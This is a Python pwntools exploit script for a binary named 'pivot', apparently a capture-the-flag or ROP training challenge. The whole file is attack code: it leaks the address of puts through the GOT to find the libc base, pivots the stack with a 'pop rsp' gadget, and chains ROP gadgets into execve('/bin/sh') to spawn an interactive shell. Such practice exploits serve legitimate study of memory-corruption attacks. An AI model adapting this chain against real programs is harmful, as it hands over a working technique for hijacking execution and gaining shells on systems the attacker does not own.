from pwn import *

context.arch = 'amd64'

r = process('./pivot')
e = ELF('./pivot')
libc = e.libc
prsp = 0x0000000000400b6d# : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
prdi = 0x0000000000400b73# : pop rdi ; ret
main = 0x0000000000400996

r.recvuntil('place to pivot: ')
stack_ptr = int(r.recv(14), 16)
log.info('stack_ptr: %#x' % stack_ptr)
rop = []
rop += [prdi, e.got['puts']]
rop += [e.plt['puts']]
rop += [main]
r.sendlineafter('> ', 'A'*0x18+flat(rop))
r.sendlineafter('> ', cyclic(0x28)+p64(prsp)+p64(stack_ptr))

libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['puts']
log.info('libc_base: %#x' % libc_base)
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh\x00').next()
execve = libc_base + libc.symbols['execve']
prsi = libc_base + libc.search(asm('pop rsi;ret')).next()
prdx = libc_base + libc.search(asm('pop rdx;ret')).next()
prax = libc_base + libc.search(asm('pop rax;ret')).next()


### second round ###
r.recvuntil('place to pivot: ')
stack_ptr = int(r.recv(14), 16)
log.info('stack_ptr: %#x' % stack_ptr)

rop = []
rop += [prdi, sh]
rop += [prsi, 0]
rop += [prdx, 0]
rop += [prax, 0x3b]
rop += [execve]
r.sendlineafter('> ', 'A'*0x18+flat(rop))
r.sendlineafter('> ', cyclic(0x28)+p64(prsp)+p64(stack_ptr))

r.interactive()
